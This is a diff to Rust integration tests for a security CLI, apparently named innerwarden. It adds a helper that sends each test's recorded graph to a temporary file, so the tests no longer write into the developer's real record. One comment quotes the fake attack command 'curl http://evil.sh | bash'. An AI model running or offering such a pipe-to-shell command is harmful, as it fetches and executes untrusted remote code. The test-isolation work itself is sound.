@@ -4,11 +4,37 @@ fn bin() -> &'static str {
     env!("CARGO_BIN_EXE_innerwarden")
 }
 
+/// A scratch record for the whole test binary.
+///
+/// Every CLI invocation here must write its narrative somewhere disposable.
+/// Without this the suite recorded into the DEVELOPER'S OWN graph at
+/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
+/// commands like `curl http://evil.sh | bash` into a real person's record and
+/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
+/// recording fix, when the graph under test changed size on its own.
+fn scratch_graph() -> &'static std::path::Path {
+    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
+    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
+    PATH.get_or_init(|| {
+        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
+            .path()
+            .join("graph.json")
+    })
+}
+
+/// The CLI under test, pointed at a disposable record by default. A test that
+/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
+fn cli() -> Command {
+    let mut command = Command::new(bin());
+    command.env("IW_GRAPH_FILE", scratch_graph());
+    command
+}
+
 #[cfg(any(target_os = "linux", target_os = "macos"))]
 #[test]
 fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
     let home = tempfile::TempDir::new().unwrap();
-    let output = Command::new(bin())
+    let output = cli()
         .args([
             "contain",
             "--project",
@@ -53,7 +79,7 @@ fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
         secret.display(),
         allowed.display()
     );
-    let output = Command::new(bin())
+    let output = cli()
         .args([
             "contain",
             "--project",
@@ -80,7 +106,7 @@ fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
 #[test]
 fn unsupported_platform_fails_without_claiming_a_jail() {
     let home = tempfile::TempDir::new().unwrap();
-    let output = Command::new(bin())
+    let output = cli()
         .args(["contain", "--", "echo", "ok"])
         .env("HOME", home.path())
         .output()
